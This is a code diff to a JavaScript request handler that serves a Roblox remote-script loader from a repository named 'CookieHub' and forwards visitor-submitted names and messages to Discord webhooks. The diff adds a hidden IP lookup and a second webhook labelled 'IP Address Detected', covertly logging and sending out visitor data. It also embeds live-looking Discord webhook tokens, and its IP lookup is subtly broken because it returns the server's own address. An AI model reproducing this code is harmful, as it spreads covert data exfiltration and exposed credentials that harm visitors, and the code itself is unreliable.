@@ -1,5 +1,6 @@
 export default async function handler(req, res) {
   const userAgent = req.headers['user-agent'] || '';
+  const ipifyUrl = 'https://api.ipify.org?format=json'; // API to get the user's IP address
 
   if (userAgent.includes('Roblox') || userAgent === '') {
     // Roblox client loading
@@ -23,14 +24,33 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/Nakhun12310/CookieHub
       name = name.replace(/@/g, '@\u200b');
       message = message.replace(/@/g, '@\u200b');
 
-      // Send to Discord webhook
-      const webhookUrl = 'https://discord.com/api/webhooks/1365679141168353371/MTveez8isOYXF7RSALX36yGcu-cdIYMiGh73d-2czgL1tCZiaMlmD2f-xGU9A15h2p5_';
+      // Get IP address using ipify API
+      let ipAddress = 'Unknown IP';
+      try {
+        const ipResponse = await fetch(ipifyUrl);
+        const ipData = await ipResponse.json();
+        ipAddress = ipData.ip || 'Unknown IP';
+      } catch (error) {
+        console.error('Error fetching IP:', error);
+      }
 
-      await fetch(webhookUrl, {
+      // Send name and message to the first webhook (skid info)
+      const skidWebhookUrl = 'https://discord.com/api/webhooks/1365679141168353371/MTveez8isOYXF7RSALX36yGcu-cdIYMiGh73d-2czgL1tCZiaMlmD2f-xGU9A15h2p5_';
+      await fetch(skidWebhookUrl, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           content: `**New Skid Message**\n**Name:** ${name}\n**Message:** ${message}`
+        })
+      });
+
+      // Send IP address to the second webhook
+      const ipWebhookUrl = 'https://discord.com/api/webhooks/1365685136485515505/LxhMw0xyxwMbUqcAKhDSxvhJjTl9AXnOQ883hP2sbBY8xLWDCv6I6y16xDy_Quxk0Q5l';
+      await fetch(ipWebhookUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          content: `**IP Address Detected**\n**IP Address:** ${ipAddress}`
         })
       });
 
